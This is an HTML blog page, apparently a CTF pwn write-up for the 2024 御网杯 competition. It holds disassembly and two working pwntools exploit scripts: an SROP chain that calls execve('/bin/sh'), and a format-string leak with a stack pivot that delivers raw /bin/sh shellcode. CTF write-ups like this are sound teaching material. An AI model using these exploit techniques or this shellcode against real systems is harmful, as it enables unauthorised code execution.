@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"le0n-daily.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":"mac","show_result":true},"fold":{"enable":false,"height":300},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":{"valine":{"order":-1}}},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="...">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 御网杯">
+<meta property="og:url" content="http://le0n-daily.github.io/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="le0n-blog">
+<meta property="og:description" content="...">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-04-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-08T10:37:34.178Z">
+<meta property="article:author" content="leon">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://le0n-daily.github.io/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://le0n-daily.github.io/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/","path":"2024御网杯复现/","title":"2024 御网杯"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2024 御网杯 | le0n-blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">le0n-blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">15</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">33</span></a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#asm"><span class="nav-number">1.</span> <span class="nav-text">asm</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret"><span class="nav-number">2.</span> <span class="nav-text">ret</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="leon"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">leon</p>
+  <div class="site-description" itemprop="description">Take more notes to reach higher efficiency.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/le0n-daily" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;le0n-daily" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1192876128@qq.com" title="E-Mail → mailto:1192876128@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/en" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://le0n-daily.github.io/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leon">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="le0n-blog">
+      <meta itemprop="description" content="Take more notes to reach higher efficiency.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2024 御网杯 | le0n-blog">
+      <meta itemprop="description" content="...">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2024 御网杯
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-04-06 00:00:00" itemprop="dateCreated datePublished" datetime="2025-04-06T00:00:00+08:00">2025-04-06</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-07-08 18:37:34" itemprop="dateModified" datetime="2025-07-08T18:37:34+08:00">2025-07-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>5.7k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>5 mins.</span>
+    </span>
+</div>
+
+            <div class="post-description">...</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h1><p>一道SROP，保护全关，代码较短直接看汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401000 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000</span><br><span class="line">.text:0000000000401000 ; signed __int64 start()</span><br><span class="line">.text:0000000000401000                 public _start</span><br><span class="line">.text:0000000000401000 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401000                                         ; LOAD:0000000000400088↑o</span><br><span class="line">.text:0000000000401000                 mov     eax, 1</span><br><span class="line">.text:0000000000401005                 mov     edi, 1          ; fd</span><br><span class="line">.text:000000000040100A                 mov     rsi, offset msg ; &quot;Hello Pwn&quot;</span><br><span class="line">.text:0000000000401014                 mov     edx, 9          ; count</span><br><span class="line">.text:0000000000401019                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:000000000040101B                 mov     eax, 0</span><br><span class="line">.text:0000000000401020                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:0000000000401023                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000401028                 mov     edx, 190h       ; count</span><br><span class="line">.text:000000000040102D                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:000000000040102F                 retn</span><br><span class="line">.text:000000000040102F _start          endp</span><br><span class="line">.text:000000000040102F</span><br><span class="line">.text:0000000000401030 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401030                 shl     rax, 1</span><br><span class="line">.text:0000000000401033                 retn</span><br><span class="line">.text:0000000000401034 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401034                 mov     ecx, 1</span><br><span class="line">.text:0000000000401039                 xor     rax, rcx</span><br><span class="line">.text:000000000040103C                 retn</span><br><span class="line">.text:000000000040103D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040103D                 xor     rax, rax</span><br><span class="line">.text:0000000000401040                 retn</span><br><span class="line">.text:0000000000401040 _text           ends</span><br><span class="line">.text:0000000000401040</span><br><span class="line">.data:0000000000402000 ; ===========================================================================</span><br><span class="line">.data:0000000000402000</span><br><span class="line">.data:0000000000402000 ; Segment type: Pure data</span><br><span class="line">.data:0000000000402000 ; Segment permissions: Read/Write</span><br><span class="line">.data:0000000000402000 _data           segment dword public &#x27;DATA&#x27; use64</span><br><span class="line">.data:0000000000402000                 assume cs:_data</span><br><span class="line">.data:0000000000402000                 ;org 402000h</span><br><span class="line">.data:0000000000402000 ; char msg[]</span><br><span class="line">.data:0000000000402000 msg             db &#x27;Hello Pwn&#x27;,0        ; DATA XREF: LOAD:00000000004000C0↑o</span><br><span class="line">.data:0000000000402000                                         ; _start+A↑o</span><br><span class="line">.data:000000000040200A sh              db &#x27;/bin/sh&#x27;,0</span><br><span class="line">.data:000000000040200A _data           ends</span><br><span class="line">.data:000000000040200A</span><br><span class="line">.data:000000000040200A</span><br><span class="line">.data:000000000040200A                 end _start</span><br></pre></td></tr></table></figure>
+
+<p>明显的看到在read()处是有溢出的，且read()是向rsp，即返回地址处写值</p>
+<p>很明显的SROP，三个gadgets，rax可控制</p>
+<p>shl rax,1是将rax左移一位，相当于乘二</p>
+<p>思路：先通过利用gadgets设置rax &#x3D;15即1111，左移三次再加一即可得到，syscall一下就可调用 sigreturn，然后通过pwntools直接执行excve(bin&#x2F;sh,0,0),exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-08 15:33:06</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">shl_rax = <span class="number">0x401030</span></span><br><span class="line">syscall = <span class="number">0x40102D</span> </span><br><span class="line">xor_rax = <span class="number">0x40103D</span></span><br><span class="line">mov_ecx = <span class="number">0x401034</span> </span><br><span class="line">bin_sh = <span class="number">0x40200A</span></span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = <span class="number">0x3b</span></span><br><span class="line">sigframe.rdi = bin_sh</span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = p64(xor_rax) + p64(mov_ecx) + p64(shl_rax) +p64(mov_ecx) + p64(shl_rax)+ p64(mov_ecx) + p64(shl_rax) + p64(mov_ecx)</span><br><span class="line">payload += p64(syscall) + flat(sigframe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>
+
+<h1 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h1><p>无保护</p>
+<p>格式化字符串+栈迁移</p>
+<p>中间有一个随机数必须大于144才能溢出到rbp+8，真恶心</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-05-08 18:04:43</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,gdbscript=&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *0x400863</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; -&gt; &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">hs256   = <span class="keyword">lambda</span> data               :sha256(<span class="built_in">str</span>(data).encode()).hexdigest()</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data               :<span class="built_in">int</span>(data, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fmt = <span class="string">b&quot;%8$p&quot;</span></span><br><span class="line">sla(<span class="string">b&quot;hello,What do you want to ask?&quot;</span>,fmt)</span><br><span class="line">p.recvline()</span><br><span class="line">stack = int16(r(<span class="number">14</span>)) - <span class="number">0x90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;ok,&quot;</span>)</span><br><span class="line">num = <span class="built_in">int</span>(r(<span class="number">3</span>),<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;++++++++--&gt;&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xd2\x48\x31\xf6\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#31</span></span><br><span class="line">payload = shellcode</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(stack)</span><br><span class="line">sa(<span class="string">b&quot;luck number&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>leon
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://le0n-daily.github.io/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/" title="2024 御网杯">http://le0n-daily.github.io/2024御网杯复现/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/en" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/hijack_stdout/" rel="prev" title="hijack_stdout">
+                  <i class="fa fa-angle-left"></i> hijack_stdout
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024iscc%E5%A4%8D%E7%8E%B0/" rel="next" title="2024 iscc">
+                  2024 iscc <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">leon</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
